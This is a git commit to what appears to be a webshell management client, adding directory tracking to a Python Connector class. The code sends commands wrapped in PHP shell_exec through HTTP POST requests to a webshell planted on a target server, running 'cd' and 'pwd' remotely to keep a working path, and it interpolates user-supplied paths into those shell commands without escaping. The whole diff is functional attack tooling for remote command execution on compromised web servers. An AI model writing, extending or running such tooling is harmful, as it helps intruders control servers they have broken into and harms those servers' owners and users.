88f8cc25456c818ce8ab42a3393f62cf45e7cfc1
0x310ct@gmail.com <3575160075@qq.com>
2025-04-29 23:50:36 +0800

    webshell无状态

--- core/Connector.py
+++ core/Connector.py
@@ -8,6 +8,7 @@ class Connector:
         self.password = password
         self.content = ""
         self.data = {"cmd":"ls"}
+        self.current_path = "/" #webshell中的路径
 
 
     def connect(self):
@@ -23,3 +24,26 @@ class Connector:
         cmd = f"shell_exec('{cmd}')"
         res = requests.post(self.url, {"cmd": f"echo {cmd};"})
         print(res.text)
+
+    def change_dir(self,new_path):
+        if not new_path.startswith("/"):
+            target_path = os.path.normpath(os.path.join(self.current_path, new_path))
+        else:
+            target_path = new_path
+
+        test_cmd = f"cd {target_path} && pwd"
+        payload = {"cmd": f"shell_exec('{test_cmd}')"}
+        res = requests.post(self.url, payload)
+        output = res.text.strip()
+
+        if output and output.startswith("/"):
+            self.current_path = output
+            self.prompt_path = self.current_path
+        else:
+            print(colored("[-] Invalid directory", "red"))
+
+    def get_initial_path(self):
+        payload = {"cmd": "shell_exec('pwd')"}
+        res = requests.post(self.url, payload)
+        path = res.text.strip()
+        return path if path else "/"
